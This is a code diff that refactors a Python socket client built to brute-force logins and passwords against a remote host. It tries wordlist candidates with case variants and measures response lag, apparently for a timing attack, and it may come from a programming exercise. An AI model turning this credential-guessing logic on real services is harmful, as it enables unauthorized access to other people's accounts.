@@ -2,14 +2,14 @@ import itertools
 import socket
 import sys
 import json
-import time
+from time import perf_counter
 from string import ascii_lowercase, ascii_uppercase, digits
 
 
 class Remote:
     def __init__(self):
         self.client_socket = socket.socket()
-        self.limit = 1000000
+        self.max_attempts = 1000000    
         self.buffer = 1024
         self.attempts = 0
         self.lag = 0
@@ -33,7 +33,7 @@ class Remote:
 
     @staticmethod
     def pass_library():
-        """Attempts passwords from dictionary with case substitution"""
+        """Attempts passwords from text file with case substitution"""
         file = open('passwords.txt', 'rt')
         passwords = file.readlines()
         file.close()
@@ -47,7 +47,7 @@ class Remote:
 
     @staticmethod
     def login_library():
-        """Attempts login from dictionary with case substitution"""
+        """Attempts logins from text file"""
         file = open('logins.txt', 'rt')
         logins = file.readlines()
         file.close()
@@ -71,17 +71,17 @@ class Remote:
 
     def send(self, pkg):
         """Sends a message (str) to the host and returns the response (str)"""
-        start = time.perf_counter()
+        start = perf_counter()
         self.client_socket.send((json.dumps(pkg)).encode())
         self.msg = json.loads(self.client_socket.recv(self.buffer).decode())['result']
-        end = time.perf_counter()
+        end = perf_counter()
         self.lag = end - start
 
     def brute(self):
         """Attempt brute force attacks. Returns the password or error. Takes """
         login_source = self.login_library()
         pass_source = self.generate()
-        while self.attempts < self.limit:
+        while self.attempts < self.max_attempts:
 
             if (self.msg == '') or (self.msg == 'Wrong login!'):
                 self.login_pkg['login'] = next(login_source)
